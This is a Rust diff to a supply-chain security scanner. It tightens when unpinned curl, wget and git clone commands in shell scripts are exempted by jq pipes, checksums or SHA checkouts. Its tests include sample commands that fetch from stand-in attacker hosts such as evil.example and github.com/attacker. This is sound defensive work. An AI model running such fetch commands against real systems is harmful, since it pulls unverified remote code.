@@ -13,9 +13,8 @@ use crate::audit_patterns::{
     SH_NPM_UNVERSIONED, SH_NPX_UNVERSIONED, SH_PIP_GIT_URL_UNVERSIONED, SH_PIP_UNVERSIONED,
     SHELL_PATTERNS, SHELL_PIPE_PATTERNS, SHELL_URL_PATTERNS, cargo_install_has_version,
     category_str, extract_urls, gem_install_has_version, gh_release_has_tag,
-    git_clone_has_pinned_ref, has_checksum_verify, has_git_checkout_sha, npm_install_has_version,
-    npx_has_version, pip_git_url_has_ref, pip_install_has_version, ps_install_has_required_version,
-    url_has_version,
+    git_clone_has_pinned_ref, has_checksum_verify, npm_install_has_version, npx_has_version,
+    pip_git_url_has_ref, pip_install_has_version, ps_install_has_required_version, url_has_version,
 };
 use crate::audited_actions::{AuditSource, AuditedActions};
 use crate::auth;
@@ -468,6 +467,538 @@ fn ends_with_pipeline_operator(line: &str) -> bool {
     line.ends_with('|') || line.ends_with("&&") || line.ends_with("||")
 }
 
+#[derive(Debug, Clone)]
+struct ShellCommand {
+    text: String,
+    stages: Vec<ShellStage>,
+}
+
+#[derive(Debug, Clone)]
+struct ShellStage {
+    text: String,
+    words: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+struct GitCloneCommand {
+    dir: String,
+    command_index: usize,
+}
+
+fn parse_shell_line(line: &str) -> Vec<ShellCommand> {
+    split_shell_control(line)
+        .into_iter()
+        .filter_map(|command| {
+            let stages: Vec<ShellStage> = split_shell_pipeline(&command)
+                .into_iter()
+                .map(|stage| ShellStage {
+                    words: shell_words(&stage),
+                    text: stage,
+                })
+                .collect();
+            if stages.is_empty() {
+                None
+            } else {
+                Some(ShellCommand {
+                    text: command,
+                    stages,
+                })
+            }
+        })
+        .collect()
+}
+
+fn split_shell_control(line: &str) -> Vec<String> {
+    split_shell(line, SplitMode::Control)
+}
+
+fn split_shell_pipeline(line: &str) -> Vec<String> {
+    split_shell(line, SplitMode::Pipeline)
+}
+
+enum SplitMode {
+    Control,
+    Pipeline,
+}
+
+fn split_shell(line: &str, mode: SplitMode) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut current = String::new();
+    let mut chars = line.chars().peekable();
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+
+    while let Some(ch) = chars.next() {
+        if escaped {
+            current.push(ch);
+            escaped = false;
+            continue;
+        }
+        if ch == '\\' && quote != Some('\'') {
+            current.push(ch);
+            escaped = true;
+            continue;
+        }
+        if let Some(q) = quote {
+            current.push(ch);
+            if ch == q {
+                quote = None;
+            }
+            continue;
+        }
+        if ch == '\'' || ch == '"' {
+            quote = Some(ch);
+            current.push(ch);
+            continue;
+        }
+
+        match mode {
+            SplitMode::Control if ch == ';' => {
+                push_shell_part(&mut out, &mut current);
+            }
+            SplitMode::Control if ch == '&' && chars.peek() == Some(&'&') => {
+                chars.next();
+                push_shell_part(&mut out, &mut current);
+            }
+            SplitMode::Control if ch == '|' && chars.peek() == Some(&'|') => {
+                chars.next();
+                push_shell_part(&mut out, &mut current);
+            }
+            SplitMode::Pipeline if ch == '|' && chars.peek() != Some(&'|') => {
+                push_shell_part(&mut out, &mut current);
+            }
+            _ => current.push(ch),
+        }
+    }
+
+    push_shell_part(&mut out, &mut current);
+    out
+}
+
+fn push_shell_part(out: &mut Vec<String>, current: &mut String) {
+    let part = current.trim();
+    if !part.is_empty() {
+        out.push(part.to_string());
+    }
+    current.clear();
+}
+
+fn shell_words(command: &str) -> Vec<String> {
+    let mut words = Vec::new();
+    let mut current = String::new();
+    let mut chars = command.chars().peekable();
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+
+    while let Some(ch) = chars.next() {
+        if escaped {
+            current.push(ch);
+            escaped = false;
+            continue;
+        }
+        if ch == '\\' && quote != Some('\'') {
+            escaped = true;
+            continue;
+        }
+        if let Some(q) = quote {
+            if ch == q {
+                quote = None;
+            } else {
+                current.push(ch);
+            }
+            continue;
+        }
+        if ch == '\'' || ch == '"' {
+            quote = Some(ch);
+            continue;
+        }
+        if ch.is_whitespace() {
+            push_shell_word(&mut words, &mut current);
+            continue;
+        }
+        if ch == '>' {
+            push_shell_word(&mut words, &mut current);
+            if chars.peek() == Some(&'>') {
+                chars.next();
+                words.push(">>".to_string());
+            } else {
+                words.push(">".to_string());
+            }
+            continue;
+        }
+        current.push(ch);
+    }
+
+    push_shell_word(&mut words, &mut current);
+    words
+}
+
+fn push_shell_word(words: &mut Vec<String>, current: &mut String) {
+    if !current.is_empty() {
+        words.push(std::mem::take(current));
+    }
+}
+
+fn url_piped_to_jq(line: &str, url: &str) -> bool {
+    parse_shell_line(line).into_iter().any(|command| {
+        let Some(fetch_stage) = command
+            .stages
+            .iter()
+            .position(|stage| stage.text.contains(url))
+        else {
+            return false;
+        };
+        command
+            .stages
+            .iter()
+            .skip(fetch_stage + 1)
+            .any(stage_invokes_jq)
+    })
+}
+
+fn stage_invokes_jq(stage: &ShellStage) -> bool {
+    command_word_index(&stage.words).is_some_and(|idx| stage.words[idx] == "jq")
+}
+
+fn command_word_index(words: &[String]) -> Option<usize> {
+    words
+        .iter()
+        .position(|word| !word.contains('=') || word.starts_with('-'))
+}
+
+fn fetch_output_targets(line: &str) -> Vec<String> {
+    let mut targets = Vec::new();
+    for command in parse_shell_line(line) {
+        for stage in command.stages {
+            if let Some(target) = fetch_output_target(&stage)
+                && !targets.contains(&target)
+            {
+                targets.push(target);
+            }
+        }
+    }
+    targets
+}
+
+fn fetch_output_target(stage: &ShellStage) -> Option<String> {
+    let fetch_index = stage
+        .words
+        .iter()
+        .position(|word| word == "curl" || word == "wget")?;
+    let fetch = stage.words[fetch_index].as_str();
+    let option_target = match fetch {
+        "curl" => curl_output_target(&stage.words[fetch_index + 1..]),
+        "wget" => wget_output_target(&stage.words[fetch_index + 1..]),
+        _ => None,
+    };
+    option_target.or_else(|| redirect_output_target(&stage.words))
+}
+
+fn curl_output_target(words: &[String]) -> Option<String> {
+    let mut urls = words
+        .iter()
+        .filter(|word| word.starts_with("http://") || word.starts_with("https://"));
+    let mut i = 0;
+    while i < words.len() {
+        let word = words[i].as_str();
+        if matches!(word, "-o" | "--output") {
+            return words.get(i + 1).and_then(|target| usable_target(target));
+        }
+        if let Some(target) = word.strip_prefix("--output=") {
+            return usable_target(target);
+        }
+        if word == "-O" || word == "--remote-name" || short_flag_has_remote_name(word) {
+            return urls.next().and_then(|url| url_basename(url));
+        }
+        if short_flag_uses_output(word) {
+            return words.get(i + 1).and_then(|target| usable_target(target));
+        }
+        if let Some(target) = curl_attached_output(word) {
+            return usable_target(target);
+        }
+        i += 1;
+    }
+    None
+}
+
+fn curl_attached_output(word: &str) -> Option<&str> {
+    let flags = word.strip_prefix('-')?;
+    if flags.starts_with('-') {
+        return None;
+    }
+    let pos = flags.find('o')?;
+    let target = &flags[pos + 1..];
+    (!target.is_empty()).then_some(target)
+}
+
+fn short_flag_uses_output(word: &str) -> bool {
+    let Some(flags) = word.strip_prefix('-') else {
+        return false;
+    };
+    !flags.starts_with('-') && flags.ends_with('o')
+}
+
+fn short_flag_has_remote_name(word: &str) -> bool {
+    let Some(flags) = word.strip_prefix('-') else {
+        return false;
+    };
+    !flags.starts_with('-') && flags.contains('O')
+}
+
+fn wget_output_target(words: &[String]) -> Option<String> {
+    let mut i = 0;
+    while i < words.len() {
+        let word = words[i].as_str();
+        if matches!(word, "-O" | "--output-document") {
+            return words.get(i + 1).and_then(|target| usable_target(target));
+        }
+        if let Some(target) = word.strip_prefix("--output-document=") {
+            return usable_target(target);
+        }
+        if let Some(target) = word.strip_prefix("-O")
+            && !target.is_empty()
+        {
+            return usable_target(target);
+        }
+        i += 1;
+    }
+    None
+}
+
+fn redirect_output_target(words: &[String]) -> Option<String> {
+    words.windows(2).find_map(|pair| {
+        if pair[0] == ">" || pair[0] == ">>" {
+            usable_target(&pair[1])
+        } else {
+            None
+        }
+    })
+}
+
+fn usable_target(target: &str) -> Option<String> {
+    let target = normalize_path_token(target);
+    (!target.is_empty() && target != "-" && !target.starts_with('&')).then_some(target)
+}
+
+fn url_basename(url: &str) -> Option<String> {
+    let clean = url.split(['?', '#']).next().unwrap_or(url);
+    let name = clean.rsplit('/').next().unwrap_or_default();
+    usable_target(name)
+}
+
+fn checksum_verifies_target(line: &str, target: &str) -> bool {
+    parse_shell_line(line).into_iter().any(|command| {
+        command
+            .stages
+            .iter()
+            .any(|stage| checksum_stage_verifies_target(stage, target))
+    })
+}
+
+fn checksum_stage_verifies_target(stage: &ShellStage, target: &str) -> bool {
+    has_checksum_verify(&stage.text)
+        && stage
+            .words
+            .iter()
+            .any(|word| checksum_word_matches_target(word, target))
+}
+
+fn checksum_word_matches_target(word: &str, target: &str) -> bool {
+    let word = normalize_path_token(word);
+    let target = normalize_path_token(target);
+    word == target
+        || word
+            .strip_prefix(&target)
+            .is_some_and(|suffix| matches!(suffix, ".sha256" | ".sha512" | ".sha1" | ".sig"))
+}
+
+fn git_clone_has_bound_sha_checkout(logical: &[(usize, String)], li: usize) -> bool {
+    let clones = unpinned_git_clones(&logical[li].1);
+    !clones.is_empty()
+        && clones
+            .iter()
+            .all(|clone| clone_has_bound_sha_checkout(logical, li, clone))
+}
+
+fn unpinned_git_clones(line: &str) -> Vec<GitCloneCommand> {
+    parse_shell_line(line)
+        .into_iter()
+        .enumerate()
+        .filter_map(|(command_index, command)| {
+            if command.stages.iter().any(stage_has_git_clone)
+                && !git_clone_has_pinned_ref(&command.text)
+            {
+                git_clone_dir(&command).map(|dir| GitCloneCommand { dir, command_index })
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn stage_has_git_clone(stage: &ShellStage) -> bool {
+    git_word_index(&stage.words)
+        .is_some_and(|idx| stage.words.get(idx + 1).is_some_and(|w| w == "clone"))
+}
+
+fn git_clone_dir(command: &ShellCommand) -> Option<String> {
+    let stage = command
+        .stages
+        .iter()
+        .find(|stage| stage_has_git_clone(stage))?;
+    let git = git_word_index(&stage.words)?;
+    let args = &stage.words[git + 2..];
+    let mut positionals = Vec::new();
+    let mut i = 0;
+    while i < args.len() {
+        let word = args[i].as_str();
+        if git_clone_option_takes_value(word) {
+            i += 2;
+            continue;
+        }
+        if let Some(flag) = word.split_once('=').map(|(flag, _)| flag)
+            && git_clone_option_takes_value(flag)
+        {
+            i += 1;
+            continue;
+        }
+        if word.starts_with('-') {
+            i += 1;
+            continue;
+        }
+        positionals.push(word);
+        i += 1;
+    }
+
+    if let Some(dir) = positionals.get(1) {
+        usable_target(dir)
+    } else {
+        positionals.first().and_then(|url| clone_default_dir(url))
+    }
+}
+
+fn git_clone_option_takes_value(flag: &str) -> bool {
+    matches!(
+        flag,
+        "-b" | "--branch"
+            | "-c"
+            | "--config"
+            | "--depth"
+            | "--origin"
+            | "-o"
+            | "--template"
+            | "--reference"
+            | "--reference-if-able"
+            | "--separate-git-dir"
+            | "--jobs"
+            | "-j"
+    )
+}
+
+fn clone_default_dir(url: &str) -> Option<String> {
+    let clean = url.trim_end_matches('/').trim_end_matches(".git");
+    usable_target(clean.rsplit(['/', ':']).next().unwrap_or(clean))
+}
+
+fn clone_has_bound_sha_checkout(
+    logical: &[(usize, String)],
+    clone_line: usize,
+    clone: &GitCloneCommand,
+) -> bool {
+    let mut current_dir: Option<String> = None;
+    for offset in 0..=3 {
+        let Some((_, line)) = logical.get(clone_line + offset) else {
+            break;
+        };
+        let commands = parse_shell_line(line);
+        for (command_index, command) in commands.iter().enumerate() {
+            if offset == 0 && command_index <= clone.command_index {
+                continue;
+            }
+            if let Some(dir) = command_cd_dir(command) {
+                current_dir = Some(dir);
+                continue;
+            }
+            if command_has_bound_checkout(command, &clone.dir, current_dir.as_deref()) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn command_cd_dir(command: &ShellCommand) -> Option<String> {
+    let stage = command.stages.first()?;
+    let idx = command_word_index(&stage.words)?;
+    if stage.words[idx] == "cd" {
+        stage.words.get(idx + 1).and_then(|dir| usable_target(dir))
+    } else {
+        None
+    }
+}
+
+fn command_has_bound_checkout(
+    command: &ShellCommand,
+    clone_dir: &str,
+    current_dir: Option<&str>,
+) -> bool {
+    command.stages.iter().any(|stage| {
+        git_checkout_sha_dir(stage).is_some_and(|checkout_dir| match checkout_dir {
+            Some(dir) => same_shell_path(&dir, clone_dir),
+            None => current_dir.is_some_and(|dir| same_shell_path(dir, clone_dir)),
+        })
+    })
+}
+
+fn git_checkout_sha_dir(stage: &ShellStage) -> Option<Option<String>> {
+    let git = git_word_index(&stage.words)?;
+    let mut checkout_dir = None;
+    let mut i = git + 1;
+    while i < stage.words.len() {
+        let word = stage.words[i].as_str();
+        if word == "-C" {
+            checkout_dir = stage.words.get(i + 1).and_then(|dir| usable_target(dir));
+            i += 2;
+            continue;
+        }
+        if let Some(dir) = word.strip_prefix("-C")
+            && !dir.is_empty()
+        {
+            checkout_dir = usable_target(dir);
+            i += 1;
+            continue;
+        }
+        if word == "checkout" && stage.words.get(i + 1).is_some_and(|sha| is_full_sha(sha)) {
+            return Some(checkout_dir);
+        }
+        i += 1;
+    }
+    None
+}
+
+fn git_word_index(words: &[String]) -> Option<usize> {
+    words.iter().position(|word| word == "git")
+}
+
+fn is_full_sha(word: &str) -> bool {
+    word.len() == 40 && word.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+fn same_shell_path(left: &str, right: &str) -> bool {
+    normalize_path_token(left) == normalize_path_token(right)
+}
+
+fn normalize_path_token(path: &str) -> String {
+    let mut path = path
+        .trim_matches(|c| matches!(c, '"' | '\'' | ')' | '(' | ',' | ';'))
+        .trim()
+        .to_string();
+    while let Some(rest) = path.strip_prefix("./") {
+        path = rest.to_string();
+    }
+    path
+}
+
 pub fn scan_shell_content(
     content: &str,
     source_file: &str,
@@ -556,13 +1087,7 @@ pub fn scan_shell_content(
         }
 
         if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
-            // Offset 0 covers a one-liner `git clone … && git checkout <sha>`,
-            // which pins the content just as deterministically.
-            let has_sha_checkout = (0..=3).any(|offset| {
-                li + offset < logical.len() && has_git_checkout_sha(&logical[li + offset].1)
-            });
-
-            if has_sha_checkout {
+            if git_clone_has_bound_sha_checkout(&logical, li) {
                 collector.push_allowed(AuditMatch {
                     severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                     category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
@@ -682,9 +1207,14 @@ pub fn scan_shell_content(
                 .iter()
                 .position(|(start, _)| *start == rel)
                 .is_some_and(|li| {
-                    (0..=3).any(|offset| {
-                        li + offset < logical.len() && has_checksum_verify(&logical[li + offset].1)
-                    })
+                    let targets = fetch_output_targets(&collector.findings[idx].pattern_matched);
+                    !targets.is_empty()
+                        && targets.iter().all(|target| {
+                            (0..=3).any(|offset| {
+                                li + offset < logical.len()
+                                    && checksum_verifies_target(&logical[li + offset].1, target)
+                            })
+                        })
                 })
         });
         if verified {
@@ -933,7 +1463,7 @@ fn check_url_patterns(
                 allowed_reason.get_or_insert(REASON_EXTRA_DATA_FORMAT);
             } else if config.is_data_format_exempt(url) {
                 allowed_reason.get_or_insert("data format URL");
-            } else if audit_patterns::fetch_piped_to_jq(line) {
+            } else if url_piped_to_jq(line, url) {
                 allowed_reason.get_or_insert("piped to jq");
             } else {
                 dangerous = true;
@@ -942,6 +1472,17 @@ fn check_url_patterns(
         }
 
         if dangerous {
+            if let Some(reason) = allowed_reason {
+                collector.push_allowed(AuditMatch {
+                    severity: output::severity_str(&pattern.severity).to_string(),
+                    category: category_str(&pattern.category).to_string(),
+                    action: action_name.to_string(),
+                    source_file: source_file.to_string(),
+                    line: Some(line_num),
+                    pattern_matched: line.trim().to_string(),
+                    reason: reason.to_string(),
+                });
+            }
             collector.push_finding(AuditFinding {
                 severity: output::severity_str(&pattern.severity).to_string(),
                 category: category_str(&pattern.category).to_string(),
@@ -1940,6 +2481,27 @@ const d = require("node:https").get("https://example.com/install.sh", cb);
     }
 
     #[test]
+    fn shell_scan_jq_exemption_does_not_cover_later_fetch() {
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "curl https://api.example.com/v1/data | jq . && curl https://evil.example/install.sh",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert_eq!(c.findings.len(), 1);
+        assert!(
+            c.findings[0]
+                .description
+                .contains("curl fetching URL without version pinning")
+        );
+        assert_eq!(c.allowed.len(), 1);
+        assert_eq!(c.allowed[0].reason, "piped to jq");
+    }
+
+    #[test]
     fn shell_scan_fetch_to_jq_then_shell_is_still_pipe_to_shell() {
         // jq anywhere in the pipeline must not downgrade a fetch that ends at a
         // shell — pipe-to-shell pre-empts and fires its own finding.
@@ -2740,6 +3302,22 @@ runs:
     }
 
     #[test]
+    fn git_clone_unrelated_sha_checkout_is_finding() {
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "git clone https://github.com/attacker/repo\ncd other\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert_eq!(c.findings.len(), 1);
+        assert!(c.findings[0].description.contains("git clone"));
+        assert!(c.allowed.is_empty());
+    }
+
+    #[test]
     fn git_clone_sha_checkout_beyond_three_lines_still_finding() {
         let mut c = AuditCollector::new(false);
         scan_shell_content(
@@ -2758,6 +3336,22 @@ runs:
         let mut c = AuditCollector::new(true);
         scan_shell_content(
             "git clone https://github.com/org/repo && cd repo && git checkout abcdef1234567890abcdef1234567890abcdef12",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert!(c.findings.is_empty());
+        assert_eq!(c.allowed.len(), 1);
+        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
+    }
+
+    #[test]
+    fn git_clone_git_c_sha_checkout_is_allowed() {
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "git clone https://github.com/org/repo d\ngit -C d checkout abcdef1234567890abcdef1234567890abcdef12",
             "test.sh",
             1,
             "",
@@ -2835,6 +3429,57 @@ runs:
         assert!(c.findings.is_empty());
         assert_eq!(c.allowed.len(), 1);
         assert_eq!(c.allowed[0].reason, "followed by checksum verification");
+    }
+
+    #[test]
+    fn shell_scan_unrelated_checksum_does_not_suppress_fetch() {
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "curl -o tool.sh https://example.com/install.sh\nsha256sum unrelated.txt",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert_eq!(c.findings.len(), 1);
+        assert!(c.findings[0].description.contains("curl fetching URL"));
+        assert!(c.allowed.is_empty());
+    }
+
+    #[test]
+    fn shell_scan_matching_checksum_suppresses_fetch() {
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "curl -o tool.sh https://example.com/install.sh\nsha256sum tool.sh",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert!(c.findings.is_empty());
+        assert_eq!(c.allowed.len(), 1);
+        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
+    }
+
+    #[test]
+    fn shell_scan_generic_checksum_manifest_does_not_suppress_fetch() {
+        // `sha256sum -c SHA256SUMS` names a manifest, not the downloaded file,
+        // so it cannot prove this artifact is pinned: the fetch still flags.
+        // Intentional tightening: a generic manifest is not target binding.
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            "curl -o tool.tgz https://example.com/tool.tgz\nsha256sum -c SHA256SUMS",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert_eq!(c.findings.len(), 1);
+        assert!(c.findings[0].description.contains("curl fetching URL"));
+        assert!(c.allowed.is_empty());
     }
 
     #[test]
